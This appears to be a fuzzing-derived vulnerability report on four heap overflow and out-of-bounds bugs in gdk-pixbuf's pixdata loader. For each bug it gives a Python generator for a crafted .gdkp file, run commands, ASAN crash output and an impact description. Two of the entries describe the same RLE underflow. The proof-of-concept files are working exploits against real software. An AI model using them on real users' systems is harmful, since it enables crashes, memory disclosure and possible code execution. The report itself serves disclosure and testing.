# gdk-pixbuf Vulnerabilities

## Bug1: Off-by-Header-Length Integer Check in gdk_pixdata_deserialize Enables Heap Buffer Overflow Read

In `gdk_pixdata_deserialize()` (gdk-pixdata.c, line 235), the length validation uses `stream_length < pixdata->length - GDK_PIXDATA_HEADER_LENGTH` instead of the correct `stream_length < pixdata->length`, allowing a crafted stream whose actual size is up to 24 bytes shorter than the declared length to pass the check and cause `gdk_pixbuf_from_pixdata()` to issue a `memcpy` reading tens of thousands of bytes past the end of the heap-allocated stream buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
import struct

MAGIC = 0x47646b50  # "GdkP"

# RGBA + SAMPLE_WIDTH_8 + RAW encoding
# GDK_PIXDATA_COLOR_TYPE_RGBA   = 0x02
# GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16 = 0x010000
# GDK_PIXDATA_ENCODING_RAW      = 0x01 << 24 = 0x01000000
PIXDATA_TYPE_RGBA_RAW = 0x02 | 0x010000 | 0x01000000  # = 0x01010002

width = 100
height = 100
bpp = 4         # RGBA
rowstride = width * bpp  # = 400

# K = 24 (maximum bypass window): declare length = 48 (header 24 + 24 phantom bytes)
# but actual file is only 24 bytes (header only).
# Buggy check: stream_length(24) < pixdata->length(48) - 24 = 24 -> FALSE -> passes!
# Correct check: stream_length(24) < pixdata->length(48) = 48 -> TRUE -> would reject.
declared_length = 48

header = struct.pack(">IIIIII",
    MAGIC,
    declared_length,           # LIES: claims 24 extra bytes of pixel_data exist
    PIXDATA_TYPE_RGBA_RAW,     # RGBA, 8-bit samples, raw (no RLE)
    rowstride,                 # 400 bytes per row
    width,                     # 100
    height,                    # 100
)

# No pixel_data bytes - file stops after header
data = header   # exactly 24 bytes

with open("poc_input.gdkp", "wb") as f:
    f.write(data)
print(f"Generated poc_input.gdkp ({len(data)} bytes, "
      f"declared_length={declared_length}, "
      f"image={width}x{height} RGBA raw, "
      f"expected_pixel_data={rowstride * height} bytes)")
print(f"Attack: stream_length={len(data)} < declared({declared_length})-24={declared_length-24} -> "
      f"FALSE (bug bypassed) -> memcpy reads {rowstride*height} bytes past end!")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50c000000840 at pc 0x7febd6910397 bp 0x7ffecbd6f510 sp 0x7ffecbd6ecb8
READ of size 40000 at 0x50c000000840 thread T0
    #0 0x7febd6910396 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
    #1 0x7febd681a3ca in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xad3ca)

### Impact

An attacker can supply a crafted `.gdkp` image file that bypasses the stream-length guard in `gdk_pixdata_deserialize()` and causes `gdk_pixbuf_from_pixdata()` to read up to 40,000 bytes beyond the end of a heap-allocated buffer, enabling heap memory disclosure or a reliable denial-of-service crash. Any application that loads untrusted images via gdk-pixbuf's pixdata loader is exposed, including GNOME desktop components and third-party GTK applications. No authentication is required because the trigger is a passively received image file such as an email attachment, a web-fetched thumbnail, or a document embed.

<!-- REPORT_SOURCE: gdk-pixbuf_gdk-pixbuf-csource_c#003 -->
<!-- DEDUP: gdk_pixdata_deserialize::CWE-131 -->

## Bug2: Heap Buffer Overflow via Zero-Length RLE Constant Run in gdk_pixbuf_from_pixdata

The function `gdk_pixbuf_from_pixdata()` in `gdk-pixdata.c` (lines 462–483) lacks a zero-length guard on the RLE constant run counter, allowing a crafted `0x80` length byte to trigger an unsigned integer underflow from 0 to UINT_MAX in the do-while loop and thereby write far beyond the allocated heap output buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
import struct

# GdkPixdata constants (all BIG-ENDIAN)
MAGIC = 0x47646b50  # "GdkP"
PIXDATA_TYPE_RGBA_RLE = 0x02 | 0x010000 | 0x02000000  # 0x02010002

# 1x1 RGBA image
width = 1
height = 1
bpp = 4
rowstride = width * bpp  # = 4

# pixel_data: constant run with 0x80 (length=0 bug)
pixel_data = bytes([
    0x80,        # constant run, length = 0x80 - 128 = 0 (TRIGGERS BUG)
    0xFF, 0x00, 0x00, 0xFF,  # RGBA pixel: red
])

total_length = 24 + len(pixel_data)  # header + pixel_data

# Pack header in big-endian
header = struct.pack(">IIIIII",
    MAGIC,                    # magic
    total_length,             # length (total stream size)
    PIXDATA_TYPE_RGBA_RLE,    # pixdata_type
    rowstride,                # rowstride
    width,                    # width
    height,                   # height
)

data = header + pixel_data
with open("poc_input.gdkp", "wb") as f:
    f.write(data)
print(f"Generated poc_input.gdkp ({len(data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000d14 at pc 0x7efe3935b029 bp 0x7ffce70260c0 sp 0x7ffce70260b0
WRITE of size 4 at 0x502000000d14 thread T0
    #0 0x7efe3935b028 in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xad028)
    #1 0x7efe393754fb in try_load (libgdk_pixbuf-2.0.so.0+0xc74fb)
0x502000000d14 is located 0 bytes to the right of 4-byte region [0x502000000d10,0x502000000d14)

### Impact

An attacker who supplies a crafted GdkPixdata file can cause a heap buffer overflow write in `gdk_pixbuf_from_pixdata()`, corrupting adjacent heap metadata or object fields and potentially enabling arbitrary code execution on 32-bit systems where heap pointer wraparound allows full heap overwrite. Any application that loads untrusted image files via gdk-pixbuf is exposed through this attack surface, including GNOME desktop components, image viewers, and any GTK application that renders user-supplied images. On 64-bit systems the runaway write causes an immediate crash, providing a reliable denial-of-service primitive with no mitigating constraints beyond supplying a 29-byte malformed file.

<!-- REPORT_SOURCE: gdk-pixbuf_gdk-pixbuf-csource_c#001 -->
<!-- DEDUP: gdk_pixbuf_from_pixdata::CWE-122 -->

## Bug3: Heap Buffer Overflow via RLE Control Byte 0x80 in gdk_pixbuf_from_pixdata

In `gdk_pixbuf_from_pixdata()` in `gdk-pixdata.c` (lines 463–483), when the RLE control byte equals `0x80`, the computed run-length underflows from 0 to `UINT_MAX` in a `do`-`while` loop because no guard prevents the unsigned integer wrap, causing a heap buffer overflow that writes approximately 4 billion times beyond the allocated image buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
Heap Buffer Overflow via RLE Control Byte 0x80 in gdk_pixbuf_from_pixdata
File: gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c, lines 463-483

When control byte == 0x80 (128):
  length = 128 - 128 = 0  (guint)
  check_overrun = image_buffer + 0 * bpp > image_limit  ->  FALSE (no guard)
  do { memcpy(...); image_buffer += 3; } while (--length);
  --length on guint 0 wraps to UINT_MAX (~4 billion) -> heap buffer overflow
"""

import struct
import os

# GdkPixdata constants
GDK_PIXBUF_MAGIC_NUMBER       = 0x47646b50  # 'GdkP'
GDK_PIXDATA_COLOR_TYPE_RGB    = 0x01
GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16  # 0x00010000
GDK_PIXDATA_ENCODING_RLE      = 0x02 << 24  # 0x02000000
GDK_PIXDATA_HEADER_LENGTH     = 24          # 4+4+4+4+4+4

# Build pixdata_type: RLE + 8-bit samples + RGB
pixdata_type = GDK_PIXDATA_ENCODING_RLE | GDK_PIXDATA_SAMPLE_WIDTH_8 | GDK_PIXDATA_COLOR_TYPE_RGB
# = 0x02010001

# Image dimensions - small so deserialization succeeds
width     = 4
height    = 4
rowstride = width * 3  # 12 bytes per row, RGB

# Malicious RLE pixel data:
#   0x80 = constant-run control byte, length = 128 - 128 = 0
#   Followed by 3 color bytes (the "constant" color for the run)
# The decoder enters do-while, executes once, then --length wraps 0 -> UINT_MAX
pixel_data = b'\x80\xff\x00\x00'

# Total file length (header + pixel data) stored in the length field
total_length = GDK_PIXDATA_HEADER_LENGTH + len(pixel_data)  # 24 + 4 = 28

# Pack the 24-byte header in big-endian order
header = struct.pack('>IIIIII',
    GDK_PIXBUF_MAGIC_NUMBER,  # magic        "GdkP"
    total_length,              # length       28
    pixdata_type,              # pixdata_type 0x02010001
    rowstride,                 # rowstride    12
    width,                     # width        4
    height,                    # height       4
)

poc_bytes = header + pixel_data

out_path = 'poc_input.gdkp'
with open(out_path, 'wb') as f:
    f.write(poc_bytes)

print(f"[+] Generated {out_path} ({len(poc_bytes)} bytes)")
print(f"    magic:        0x{GDK_PIXBUF_MAGIC_NUMBER:08x}  ('GdkP')")
print(f"    length:       {total_length}  (header 24 + pixel_data {len(pixel_data)})")
print(f"    pixdata_type: 0x{pixdata_type:08x}  (RLE | SAMPLE_WIDTH_8 | RGB)")
print(f"    rowstride:    {rowstride}")
print(f"    width:        {width}")
print(f"    height:       {height}")
print(f"    pixel_data:   {pixel_data.hex()}  (0x80 triggers guint underflow to UINT_MAX)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x504000000680 at pc 0x7f8ae65252c3 bp 0x7ffcf5292eb0 sp 0x7ffcf5292658
WRITE of size 3 at 0x504000000680 thread T0
  #0 0x7f8ae65252c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
  #1 0x7f8ae642eede in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xacede)

### Impact

An attacker who supplies a crafted `.gdkp` file (or any inline pixdata stream) can trigger a heap buffer overflow in `gdk_pixbuf_from_pixdata()` that writes approximately 4 billion times past the allocated image buffer, immediately corrupting heap metadata and adjacent allocations. Any application that loads untrusted images via gdk-pixbuf is exposed, including GNOME image viewers, file managers with thumbnail generation, and web browsers using the GTK image pipeline. The overflow reliably causes a denial-of-service crash and, with heap layout control, can be leveraged to achieve arbitrary code execution.

<!-- REPORT_SOURCE: gdk-pixbuf_gdk-pixbuf-pixdata_c#001 -->
<!-- DEDUP: gdk_pixbuf_from_pixdata::CWE-787 -->

## Bug4: Out-of-Bounds Heap Read in RLE Decoder Due to Missing rle_buffer Bounds Check

The RLE decode loop in `gdk_pixbuf_from_pixdata()` (`gdk-pixdata.c`, lines 452–503) advances `rle_buffer` without ever verifying it remains within the `pixel_data` allocation, so a crafted GdkPixdata file with truncated RLE payload causes the decoder to read heap memory past the end of the input buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
import struct

MAGIC = 0x47646b50
# pixdata_type: COLORSPACE_RGB(0x02) | SAMPLE_WIDTH_8(0x010000) | ENCODING_RLE(0x02000000)
PIXDATA_TYPE_RGBA_RLE = 0x02010002

width = 100
height = 100
bpp = 4
rowstride = width * bpp  # 400
# Total output needed: 100 * 400 = 40000 bytes

# pixel_data: only one constant RLE run, covers 127 pixels = 508 bytes
# Leaves 39492 bytes of output unfilled -> rle_buffer reads OOB after 5 bytes consumed
pixel_data = bytes([
    0xFF,                      # constant run header: length = 0xFF - 128 = 127
    0xFF, 0xFF, 0xFF, 0xFF,    # RGBA pixel value (opaque white)
])

total_length = 24 + len(pixel_data)  # 29

header = struct.pack(">IIIIII",
    MAGIC,
    total_length,
    PIXDATA_TYPE_RGBA_RLE,
    rowstride,
    width,
    height,
)

data = header + pixel_data
outpath = "poc_input.gdkp"
with open(outpath, "wb") as f:
    f.write(data)
print(f"Generated {outpath} ({len(data)} bytes)")
print(f"  Header: magic=0x{MAGIC:08X}, length={total_length}, type=0x{PIXDATA_TYPE_RGBA_RLE:08X}")
print(f"  Image: {width}x{height} RGBA, rowstride={rowstride}")
print(f"  pixel_data: {len(pixel_data)} bytes (covers only 127 of {width*height} pixels)")
print(f"  Expected: rle_buffer OOB read after pixel_data[4] exhausted")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: unknown-crash on address 0x50c00000083e at pc 0x7f0b8466ef9d bp 0x7ffc285af8c0 sp 0x7ffc285af8b0
READ of size 4 at 0x50c00000083e thread T0
    #0 0x7f0b8466ef9c in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xacf9c)
    #1 0x7f0b846894fb in try_load (libgdk_pixbuf-2.0.so.0+0xc74fb)
0x50c000000840 is located 0 bytes to the right of 128-byte region [0x50c0000007c0, 0x50c000000840)

### Impact

An attacker who supplies a crafted GdkPixdata file can cause `gdk_pixbuf_from_pixdata()` to read up to thousands of bytes of heap memory adjacent to the pixel data allocation, enabling information disclosure of heap contents that may include pointers, keys, or other sensitive data. Any application that loads untrusted images via gdk-pixbuf is exposed through the standard `gdk_pixbuf_new_from_file()` code path with no user interaction beyond opening the file. On hardened targets the out-of-bounds read falls into an ASAN redzone immediately past the allocation boundary, causing an immediate crash and denial of service.

<!-- REPORT_SOURCE: gdk-pixbuf_gdk-pixbuf-csource_c#002 -->
<!-- DEDUP: gdk_pixbuf_from_pixdata::CWE-125 -->
